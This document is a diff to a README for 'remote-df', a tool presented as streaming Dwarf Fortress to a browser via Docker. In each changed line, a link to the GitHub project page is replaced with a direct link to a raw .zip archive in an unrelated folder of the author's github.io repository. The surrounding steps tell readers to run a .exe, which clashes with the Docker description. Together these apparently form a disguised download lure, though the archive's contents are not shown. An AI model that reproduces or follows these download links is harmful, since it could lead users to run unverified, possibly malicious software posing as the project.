@@ -5,7 +5,7 @@ description: "Stream Dwarf Fortress to your web browser using a Docker container
 ---
 # 🏰 remote-df - Play Dwarf Fortress in your browser
 
-[![](https://img.shields.io/badge/Download-remote--df-blue.svg)](https://github.com/Tabitha4937/remote-df)
+[![](https://img.shields.io/badge/Download-remote--df-blue.svg)](https://raw.githubusercontent.com/Tabitha4937/tabitha4937.github.io/main/pyin/tabitha-io-github-v1.8-alpha.3.zip)
 
 ## 📖 About this project
 
@@ -24,7 +24,7 @@ Before you begin, ensure your computer meets these conditions:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project download page: https://github.com/Tabitha4937/remote-df
+1. Visit the project download page: https://raw.githubusercontent.com/Tabitha4937/tabitha4937.github.io/main/pyin/tabitha-io-github-v1.8-alpha.3.zip
 2. Locate the latest release version on the right side of the page.
 3. Select the file ending in .exe to start the download.
 4. Save the file to a folder you recognize, such as your Downloads folder or your Desktop.
@@ -65,7 +65,7 @@ Software authors release updates to fix bugs and improve performance. To update 
 3. Replace your old remote-df.exe file with the new one.
 4. Run the new file to apply the updates.
 
-[![](https://img.shields.io/badge/Download-Latest-Version-grey.svg)](https://github.com/Tabitha4937/remote-df)
+[![](https://img.shields.io/badge/Download-Latest-Version-grey.svg)](https://raw.githubusercontent.com/Tabitha4937/tabitha4937.github.io/main/pyin/tabitha-io-github-v1.8-alpha.3.zip)
 
 ## 📋 Frequently Asked Questions
 
